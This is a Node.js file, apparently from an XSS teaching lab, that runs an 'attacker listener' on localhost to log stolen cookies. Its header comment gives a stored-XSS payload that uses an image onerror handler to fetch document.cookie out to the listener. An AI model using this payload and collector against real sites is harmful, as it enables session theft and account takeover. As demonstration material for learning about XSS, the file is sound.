/**
 * Attacker "listener" — a minimal HTTP server that logs whatever
 * is sent to /steal, to demonstrate stolen-cookie exfiltration.
 *
 * Run with: node attacker/listener.js
 * Listens on: http://localhost:4000
 *
 * Use this payload in VULNERABLE mode on the comment wall:
 *
 *   <img src=x onerror="fetch('http://localhost:4000/steal?c='+document.cookie)">
 *
 * When another "victim" browser/tab loads the wall, their cookie
 * gets sent here and printed to this console.
 */

const http = require("http");
const url = require("url");

const PORT = 4000;

const server = http.createServer((req, res) => {
  const parsed = url.parse(req.url, true);

  if (parsed.pathname === "/steal") {
    const stolen = parsed.query.c || "(no cookie received)";
    console.log("\n🚨 Stolen cookie received!");
    console.log("   From:", req.socket.remoteAddress);
    console.log("   Cookie:", stolen, "\n");
  }

  // Respond so the browser's fetch() doesn't error out loudly.
  res.writeHead(200, {
    "Content-Type": "text/plain",
    "Access-Control-Allow-Origin": "*",
  });
  res.end("ok");
});

server.listen(PORT, () => {
  console.log(`Attacker listener running at http://localhost:${PORT}/steal`);
  console.log("Waiting for stolen cookies...");
});
